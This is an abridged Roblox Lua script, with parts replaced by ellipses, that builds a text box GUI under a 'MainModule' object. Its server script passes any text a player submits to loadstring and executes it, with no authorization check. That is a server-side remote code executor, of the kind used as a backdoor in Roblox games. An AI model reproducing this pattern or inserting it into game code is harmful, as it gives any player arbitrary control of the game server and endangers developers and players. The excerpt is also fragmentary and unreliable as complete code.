...
ScreenGui.Parent = game.Workspace.MainModule
...
TextBox.Position = UDim2.new(0.546483934, 0, 0.711757243, 0)
...
do -- nil.Loadstring
	...
	local function module_script()
		...
		return function(source, env, name)
			...
			local name = (env.script and env.script:GetFullName()) or name
...
local function ZIZBCRQ_fake_script() -- TextBox.Script 
	...
	script.Parent.RemoteFunction.OnServerInvoke = function(player, text)
		local executable, compileFailReason = loadstring(text)
		executable()
	end
end
coroutine.wrap(ZIZBCRQ_fake_script)()
local function PIROTS_fake_script() -- TextBox.LocalScript 
	...
	script.Parent.TextButton.MouseButton1Click:Connect(function()
		script.Parent.RemoteFunction:InvokeServer(script.Parent.Text)
	end)
end
coroutine.wrap(PIROTS_fake_script)()
